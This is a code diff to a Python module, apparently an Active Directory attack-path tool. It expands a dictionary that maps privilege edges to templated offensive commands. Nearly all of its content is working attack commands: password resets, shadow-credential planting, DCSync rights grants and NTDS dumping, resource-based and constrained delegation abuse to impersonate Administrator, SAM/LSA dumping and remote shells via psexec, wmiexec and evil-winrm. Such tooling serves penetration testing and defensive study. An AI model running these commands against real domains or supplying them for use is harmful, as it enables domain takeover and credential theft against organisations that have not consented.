@@ -91,44 +91,75 @@ RIGHT_RANK = {
 
 ABUSE = {
     "genericall": [
-        {"os": "linux", "tool": "certipy shadow", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
-        {"os": "linux", "tool": "bloodyAD password reset", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
-        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
+        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
+        {"os": "linux", "tool": "pyWhisker (Shadow Creds)", "cmd": "pywhisker.py -d {domain} -u '{src}' -p '<pass>' --target '{dst}' --action add"},
+        {"os": "linux", "tool": "bloodyAD (password reset)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
+        {"os": "linux", "tool": "targetedKerberoast (set SPN)", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user '{dst}'"},
+        {"os": "windows", "tool": "Whisker (Shadow Creds)", "cmd": "Whisker.exe add /target:{dst}"},
+        {"os": "windows", "tool": "PowerView (reset)", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
     ],
     "genericwrite": [
-        {"os": "linux", "tool": "targetedKerberoast", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user {dst}"},
+        {"os": "linux", "tool": "targetedKerberoast (WriteSPN)", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user '{dst}'"},
+        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
+        {"os": "linux", "tool": "bloodyAD (set SPN)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set object '{dst}' servicePrincipalName -v 'adapwn/x'"},
         {"os": "windows", "tool": "PowerView + Rubeus", "cmd": "Set-DomainObject -Identity {dst} -Set @{{serviceprincipalname='adapwn/http'}}; Rubeus.exe kerberoast /user:{dst} /nowrap"},
+        {"os": "windows", "tool": "Whisker (Shadow Creds)", "cmd": "Whisker.exe add /target:{dst}"},
     ],
     "writedacl": [
         {"os": "linux", "tool": "impacket-dacledit", "cmd": "impacket-dacledit -action write -rights FullControl -principal '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (grant GenericAll)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add genericAll '{dst}' '{src}'"},
+        {"os": "linux", "tool": "bloodyAD (grant DCSync, domain head)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add dcsync '{src}'"},
         {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainObjectAcl -TargetIdentity '{dst}' -PrincipalIdentity '{src}' -Rights All"},
     ],
     "writeowner": [
-        {"os": "linux", "tool": "owneredit + dacledit", "cmd": "impacket-owneredit -action write -new-owner '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
-        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainObjectOwner -Identity '{dst}' -OwnerIdentity '{src}'"},
+        {"os": "linux", "tool": "impacket (owner -> dacl)", "cmd": "impacket-owneredit -action write -new-owner '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>  &&  impacket-dacledit -action write -rights FullControl -principal '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (owner -> GenericAll)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set owner '{dst}' '{src}'  &&  bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add genericAll '{dst}' '{src}'"},
+        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainObjectOwner -Identity '{dst}' -OwnerIdentity '{src}'; Add-DomainObjectAcl -TargetIdentity '{dst}' -PrincipalIdentity '{src}' -Rights All"},
     ],
     "addkeycredentiallink": [
-        {"os": "linux", "tool": "certipy shadow", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "certipy (Shadow Creds)", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (Shadow Creds)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add shadowCredentials '{dst}'"},
+        {"os": "linux", "tool": "pyWhisker + PKINIT", "cmd": "pywhisker.py -d {domain} -u '{src}' -p '<pass>' --target '{dst}' --action add   # then gettgtpkinit.py / getnthash.py"},
+        {"os": "windows", "tool": "Whisker", "cmd": "Whisker.exe add /target:{dst}"},
     ],
     "forcechangepassword": [
         {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
+        {"os": "linux", "tool": "net rpc", "cmd": "net rpc password '{dst}' 'Newp@ss123!' -U '{domain}/{src}%<pass>' -S <dc>"},
+        {"os": "linux", "tool": "rpcclient", "cmd": "rpcclient -U '{domain}/{src}%<pass>' <dc> -c \"setuserinfo2 {dst} 23 Newp@ss123!\""},
         {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
     ],
     "addmember": [
         {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add groupMember '{dst}' '{src}'"},
+        {"os": "linux", "tool": "net rpc", "cmd": "net rpc group addmem '{dst}' '{src}' -U '{domain}/{src}%<pass>' -S <dc>"},
         {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainGroupMember -Identity '{dst}' -Members '{src}'"},
     ],
+    "allowedtoact": [
+        {"os": "linux", "tool": "impacket-rbcd", "cmd": "impacket-rbcd -delegate-from 'attacker$' -delegate-to '{dst}' -action write {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
+        {"os": "linux", "tool": "bloodyAD (RBCD)", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add rbcd '{dst}' 'attacker$'"},
+        {"os": "linux", "tool": "getST (S4U2self+proxy)", "cmd": "impacket-getST -spn 'cifs/{dst}' -impersonate Administrator {domain}/'attacker$':'<machine-pass>' -dc-ip <dc-ip>"},
+    ],
+    "allowedtodelegate": [
+        {"os": "linux", "tool": "getST (constrained S4U)", "cmd": "impacket-getST -spn 'cifs/<target-host>' -impersonate Administrator {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
+        {"os": "windows", "tool": "Rubeus s4u", "cmd": "Rubeus.exe s4u /user:{src} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt"},
+    ],
     "dcsync": [
-        {"os": "linux", "tool": "secretsdump", "cmd": "impacket-secretsdump {domain}/'{src}':'<pass>'@<dc> -just-dc"},
+        {"os": "linux", "tool": "impacket-secretsdump", "cmd": "impacket-secretsdump {domain}/'{src}':'<pass>'@<dc> -just-dc"},
+        {"os": "linux", "tool": "netexec", "cmd": "nxc smb <dc> -d {domain} -u '{src}' -p '<pass>' --ntds"},
         {"os": "windows", "tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"},
     ],
     "adminto": [
-        {"os": "linux", "tool": "psexec / evil-winrm", "cmd": "impacket-psexec {domain}/'{src}':'<pass>'@{dst}"},
+        {"os": "linux", "tool": "evil-winrm", "cmd": "evil-winrm -i {dst} -u '{src}' -p '<pass>'"},
+        {"os": "linux", "tool": "impacket-psexec", "cmd": "impacket-psexec {domain}/'{src}':'<pass>'@{dst}"},
+        {"os": "linux", "tool": "impacket-wmiexec", "cmd": "impacket-wmiexec {domain}/'{src}':'<pass>'@{dst}"},
+        {"os": "linux", "tool": "netexec (SAM/LSA)", "cmd": "nxc smb {dst} -d {domain} -u '{src}' -p '<pass>' --sam --lsa"},
         {"os": "windows", "tool": "PsExec", "cmd": "PsExec.exe \\\\{dst} cmd"},
     ],
     "readgmsapassword": [
         {"os": "linux", "tool": "netexec gMSA", "cmd": "nxc ldap <dc> -d {domain} -u '{src}' -p '<pass>' --gmsa"},
         {"os": "linux", "tool": "bloodyAD gMSA", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> get object '{dst}' --attr msDS-ManagedPassword"},
+        {"os": "linux", "tool": "gMSADumper", "cmd": "python3 gMSADumper.py -u '{src}' -p '<pass>' -d {domain} -l <dc>"},
     ],
 }
 for alias, target in {
@@ -139,10 +170,8 @@ for alias, target in {
     "allextendedrights": "dcsync",
     "writespn": "genericwrite",
     "addspn": "genericwrite",
-    "allowedtoact": "adminto",
-    "allowedtodelegate": "adminto",
     "synclapspassword": "genericall",
-    "writeaccountrestrictions": "adminto",
+    "writeaccountrestrictions": "genericwrite",
 }.items():
     ABUSE.setdefault(alias, ABUSE.get(target, []))
 
